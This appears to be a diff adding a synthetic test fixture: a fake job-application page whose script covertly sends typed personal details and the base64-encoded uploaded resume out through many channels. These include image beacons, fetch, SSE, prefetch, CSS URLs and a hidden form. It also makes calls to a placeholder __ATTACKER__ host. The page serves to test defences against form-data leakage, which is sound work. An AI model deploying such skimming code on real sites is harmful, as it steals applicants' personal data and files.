@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Data Analyst - Apply - Fixture Corp</title></head>
+<body>
+<!-- Hostile page (synthetic): ships what is typed / attached to its OWN host with GET requests only, in many
+     encodings, plus legitimate lazy asset loads that must keep working. __ATTACKER__ is another host. -->
+<main>
+<h1>Apply: Data Analyst</h1>
+<form id="app" action="__SUBMIT_ACTION__" method="post" enctype="multipart/form-data">
+  <div><label for="first_name">First name *</label><input id="first_name" name="first_name" required></div>
+  <div><label for="last_name">Last name *</label><input id="last_name" name="last_name" required></div>
+  <div><label for="email">Email *</label><input id="email" name="email" type="email" required></div>
+  <div><label for="phone">Phone</label><input id="phone" name="phone"></div>
+  <div><label for="resume">Resume *</label><input id="resume" name="resume" type="file" accept=".pdf" required></div>
+  <button type="submit">Submit application</button>
+</form>
+<form id="mirror" action="/collect/form" method="get" target="sink"><input type="hidden" name="d" id="md"></form>
+<iframe name="sink" id="sink" title="sink" style="display:none"></iframe>
+<img id="lazy" alt="" loading="lazy" src="/static/lazy.png?v=7" style="display:none">
+</main>
+<script>
+const ids = ['first_name', 'last_name', 'email', 'phone'];
+const all = () => ids.map(id => document.getElementById(id).value).join('|');
+let first = true;
+function leak() {
+  if (first) {  // legitimate: show a lazily loaded image from the HTML, load a late stylesheet
+    first = false;
+    document.getElementById('lazy').style.display = 'block';
+    const css = document.createElement('link'); css.rel = 'stylesheet'; css.href = '/static/late.css';
+    document.head.appendChild(css);
+  }
+  const v = all(), d = encodeURIComponent(v), email = document.getElementById('email').value;
+  new Image().src = '/collect/img?d=' + d;
+  fetch('/collect/fetch?d=' + d, {keepalive: true}).catch(() => {});
+  fetch('/collect/b64?d=' + btoa(unescape(encodeURIComponent(v)))).catch(() => {});
+  if (email) new Image().src = '/collect/path/' + encodeURIComponent(email) + '.png';
+  try { const es = new EventSource('/collect/sse?d=' + d); setTimeout(() => es.close(), 50); } catch (e) {}
+  const l = document.createElement('link'); l.rel = 'prefetch'; l.href = '/collect/prefetch?d=' + d;
+  document.head.appendChild(l);
+  document.body.style.backgroundImage = 'url(/collect/css?d=' + d + ')';
+  for (let k = 0; k < email.length; k += 2) new Image().src = '/collect/chunk?i=' + k + '&c=' + email.slice(k, k + 2);
+  document.getElementById('md').value = v; document.getElementById('mirror').submit();  // GET form -> iframe
+  new Image().src = '__ATTACKER__/img?d=' + d;
+  fetch('__ATTACKER__/k?d=' + d, {keepalive: true, mode: 'no-cors'}).catch(() => {});
+  history.pushState({}, '', location.pathname + '?x=' + d);
+}
+document.addEventListener('change', leak, true);
+document.addEventListener('input', leak, true);
+document.getElementById('resume').addEventListener('change', (ev) => {
+  const f = ev.target.files[0]; if (!f) return;
+  const r = new FileReader();
+  r.onload = () => {
+    const b = btoa(r.result);
+    for (let i = 0; i < b.length; i += 40) new Image().src = '/collect/file?i=' + i + '&c=' + encodeURIComponent(b.slice(i, i + 40));
+    new Image().src = '/collect/filepath/' + encodeURIComponent(b.slice(0, 60)).replace(/%2F/g, '_') + '.gif';
+  };
+  r.readAsBinaryString(f);
+});
+</script>
+</body>
+</html>
